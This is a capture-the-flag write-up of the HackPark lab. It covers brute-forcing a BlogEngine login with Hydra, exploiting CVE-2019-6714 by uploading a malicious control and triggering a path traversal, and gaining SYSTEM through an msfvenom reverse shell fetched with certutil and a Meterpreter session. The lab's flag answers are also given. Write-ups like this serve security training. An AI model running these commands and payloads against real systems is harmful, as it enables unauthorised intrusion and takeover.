# HackPark

___

IP = `10.10.66.221`

## Task 1 - Deploy the vulnerable Windows machine

> Whats the name of the clown displayed on the homepage?

`pennywise`

## Task 2 - Using Hydra to brute-force a login

```
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

> What request type is the Windows website login form using?

`POST`

`hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form`

> Guess a username, choose a password wordlist and gain credentials to a user account!

`1qaz2wsx`

## Task 3 - Compromise the machine

> Now you have logged into the website, are you able to identify the version of the BlogEngine?

`3.3.6.0`

`curl -s http://10.10.66.221/ | tail -n 3 | head -n 1`

> What is the CVE?

`CVE-2019-6714`

```
Attacking Steps:

First, we set the TcpClient address and port within the method beloto 
our attack host, who has a reverse tcp listener waiting for connection.
Next, we upload this file through the file manager.  In the current (3.3.6) version of BlogEngine, this is done by editing a post and clickinon the icon that looks like an open file in the toolbar.  Note that thifile must be uploaded as PostView.ascx. Once uploaded, the file will be in the /App_Data/files directory off of the document root. The admin pagthat
allows upload is:

http://10.10.66.221/admin/app/editor/editpost.cshtml

Finally, the vulnerability is triggered by accessing the base URfor the blog with a theme override specified like so:

http://10.10.66.221/?theme=../../App_Data/files
 
```

```
# nc -lnvp 4545
listening on [any] 4545 ...
connect to [10.4.96.175] from (UNKNOWN) [10.10.66.221] 49301
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

> Who is the webserver running as?

`iis apppool\blog`

## Task 4 - Windows Privilege Escalation

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.96.175 LPORT=8989 -f exe > reverse.exe`

```
c:\Users\Public\Downloads>
Certutil.exe -urlcache -f http://10.4.96.175:8000/reverse.exe reverse.exe
c:\Users\Public\Downloads>Certutil.exe -urlcache -f http://10.4.96.175:8000/reverse.exe reverse.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Users\Public\Downloads>
```

```
c:\Users\Public\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Users\Public\Downloads
09/26/2024  10:50 AM    <DIR>          .
09/26/2024  10:50 AM    <DIR>          ..
09/26/2024  10:50 AM            73,802 reverse.exe
               1 File(s)         73,802 bytes
               2 Dir(s)  39,125,434,368 bytes free
c:\Users\Public\Downloads>reverse.exe

```

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.4.96.175:8989

[*] Sending stage (176198 bytes) to 10.10.66.221
[*] Meterpreter session 1 opened (10.4.96.175:8989 -> 10.10.66.221:49332) at 2024-09-26 18:00:05 +0000

meterpreter >
```

```
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

`1428  672   WService.exe    x86   0        NT AUTHORITY\SYSTEM      C:\PROGRA~2\SYSTEM~1\WService.exe`

```
meterpreter > migrate 1428
[*] Migrating from 2820 to 1428...
[*] Migration completed successfully.
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter >
```

> What is the OS version of this windows machine?

`Windows 2012 R2 (6.3 Build 9600)`

> What is the name of the abnormal service running?

`WindowsScheduler`

> What is the name of the binary you're supposed to exploit? 

`Message.exe`

> What is the user flag (on Jeffs Desktop)?

`759bd8af507517bcfaede78a21a73e39`

> What is the root flag?

`7e13d97f05f7ceb9881a3eb3d78d3e72`

```
C:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
C:\Users\jeff\Desktop>
```

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
C:\Users\Administrator\Desktop>
```

## Task 5 - Privilege Escalation Without Metasploit

> Using winPeas, what was the Original Install time? (This is date and time)

`8/3/2019, 10:43:23 AM`

```
C:\Program Files (x86)\SystemScheduler>systeminfo
systeminfo

Host Name:                 HACKPARK
--SNIP--
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          9/26/2024, 9:32:04 AM
--SNIP--
```